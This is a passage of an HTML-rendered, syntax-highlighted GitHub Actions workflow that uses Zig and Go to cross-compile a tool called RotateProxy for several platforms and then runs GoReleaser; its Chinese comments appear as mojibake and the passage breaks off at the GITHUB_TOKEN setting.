style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e26\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e27\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e28\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e29\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e30\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e31\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e32\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e33\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e34\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e35\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e36\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e37\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e38\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e39\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e40\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e41\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e42\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e43\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e44\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e45\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e46\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e47\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e48\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e49\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e50\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e51\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e52\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e53\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e54\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e55\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e56\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e57\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e58\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e59\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e60\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e61\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e62\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e63\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e64\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e65\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e66\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e67\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e68\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e69\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e70\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e71\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e72\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e73\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e74\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e75\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e76\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e77\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e78\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e79\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e80\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ebuild\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eon\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003epush\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003etags\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;*\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003ejobs\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ebuild-rotateproxy\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eruns-on\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eubuntu-18.04\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003esteps\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eCheckout\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003euses\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eactions/checkout@v2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eSetup Zig\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003euses\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003egoto-bus-stop/setup-zig@v1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003ewith\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003eversion\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0.9.1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eSetup Golang\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003euses\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eactions/setup-go@v2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003ewith\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003ego-version\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1.17\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eBuild RotateProxy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003erun\u003c/span\u003e: |\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          # download macos sysroot\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          git clone --depth=1 https://github.com/hexops/sdk-macos-12.0.git \u0026#34;$HOME/macos-SDK\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          # create zig script\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          mkdir -p \u0026#34;$HOME/.bin\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          export PATH=$PATH:\u0026#34;$HOME/.bin\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          touch \u0026#34;$HOME/.bin/zcc\u0026#34; \u0026amp;\u0026amp; touch \u0026#34;$HOME/.bin/zxx\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          chmod +x \u0026#34;$HOME/.bin/zcc\u0026#34; \u0026amp;\u0026amp; chmod +x \u0026#34;$HOME/.bin/zxx\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          mkdir -p build\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          cd cmd/rotateproxy\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          configs=(\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            \u0026#39;linux amd64 x86_64-linux-musl\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            \u0026#39;linux 386 i386-linux-musl\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            \u0026#39;windows amd64 x86_64-windows-gnu\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            \u0026#39;windows 386 i386-windows-gnu\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            \u0026#39;darwin amd64 x86_64-macos-gnu\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          )\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          IFS=$\u0026#39;\\n\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          for i in ${configs[@]}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          do\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            IFS=$\u0026#39; \u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            config=($i)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            goos=${config[0]}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            goarch=${config[1]}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            libc=${config[2]}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            ext=\u0026#39;\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            if [ \u0026#34;${goos}\u0026#34; = \u0026#34;windows\u0026#34; ];then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e              ext=\u0026#39;.exe\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            fi\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            # ref: https://dev.to/kristoff/zig-makes-go-cross-compilation-just-work-29ho\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            echo \u0026#34;goos: ${goos}  goarch: ${goarch}  libc: ${libc}\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            echo \u0026#39;#!/bin/sh\u0026#39; \u0026gt; \u0026#34;$HOME/.bin/zcc\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            echo \u0026#39;#!/bin/sh\u0026#39; \u0026gt; \u0026#34;$HOME/.bin/zxx\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            # ref: https://github.com/ziglang/zig/issues/10660\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            # ref: https://github.com/ziglang/zig/issues/1349\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            # ref: https://github.com/ziglang/zig/issues/10299#issuecomment-989153750\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            if [ \u0026#34;${goos}\u0026#34; = \u0026#34;darwin\u0026#34; ];then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e              # zig 0.10.0å…³äºsysrootçš„è¡Œä¸ºæœ‰å˜æ›´ï¼Œå‚è§ https://github.com/ziglang/zig/issues/10790#issuecomment-1030712395\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e              echo \u0026#39;ZIG_LOCAL_CACHE_DIR=\u0026#34;$HOME/tmp\u0026#34; zig cc -target \u0026#39;${libc}\u0026#39; --sysroot=\u0026#34;$HOME/macos-SDK/root\u0026#34; -I\u0026#34;$HOME/macos-SDK/root/usr/include\u0026#34; -L\u0026#34;$HOME/macos-SDK/root/usr/lib\u0026#34; -F\u0026#34;$HOME/macos-SDK/root/System/Library/Frameworks\u0026#34; $@\u0026#39; \u0026gt;\u0026gt; \u0026#34;$HOME/.bin/zcc\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e              echo \u0026#39;ZIG_LOCAL_CACHE_DIR=\u0026#34;$HOME/tmp\u0026#34; zig c++ -target \u0026#39;${libc}\u0026#39; --sysroot=\u0026#34;$HOME/macos-SDK/root\u0026#34; -I\u0026#34;$HOME/macos-SDK/root/usr/include\u0026#34; -L\u0026#34;$HOME/macos-SDK/root/usr/lib\u0026#34; -F\u0026#34;$HOME/macos-SDK/root/System/Library/Frameworks\u0026#34; $@\u0026#39; \u0026gt;\u0026gt; \u0026#34;$HOME/.bin/zxx\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e              # zig cc è°ƒç”¨clangï¼Œclangæ›´æ–°åé»˜è®¤åŠ äº†ä¸€äº›å‚æ•°ï¼Œè§ https://github.com/golang/go/issues/38876 https://stackoverflow.com/questions/42074035\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e              # ç»è¿‡æµ‹è¯•æœ€åŸºæœ¬éœ€è¦ -Wno-nullability-completeness -Wno-expansion-to-defined -Wno-availability\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e              export CGO_CPPFLAGS=\u0026#34;-Wno-error -Wno-nullability-completeness -Wno-expansion-to-defined -Wno-builtin-requires-header -Wno-availability\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            else\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e              echo \u0026#39;ZIG_LOCAL_CACHE_DIR=\u0026#34;$HOME/tmp\u0026#34; zig cc -target \u0026#39;${libc}\u0026#39; $@\u0026#39; \u0026gt;\u0026gt; \u0026#34;$HOME/.bin/zcc\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e              echo \u0026#39;ZIG_LOCAL_CACHE_DIR=\u0026#34;$HOME/tmp\u0026#34; zig c++ -target \u0026#39;${libc}\u0026#39; $@\u0026#39; \u0026gt;\u0026gt; \u0026#34;$HOME/.bin/zxx\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            fi\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            cat \u0026#34;$HOME/.bin/zxx\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            cat \u0026#34;$HOME/.bin/zcc\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            CGO_ENABLED=1 GOOS=\u0026#34;${goos}\u0026#34; GOARCH=\u0026#34;${goarch}\u0026#34; CC=\u0026#34;zcc\u0026#34; CXX=\u0026#34;zxx\u0026#34; go build -o \u0026#34;../../build/rotateproxy-${goos}-${goarch}${ext}\u0026#34; -trimpath -ldflags=\u0026#34;-linkmode=external -extldflags=-static -s -w\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          done\u003c/span\u003e          \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eRun GoReleaser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003euses\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003egoreleaser/goreleaser-action@v2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003ewith\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003eversion\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003elatest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003eargs\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003erelease --rm-dist\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eenv\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003eGITHUB_TOKEN\u003c/span\u003e: \u003cspan 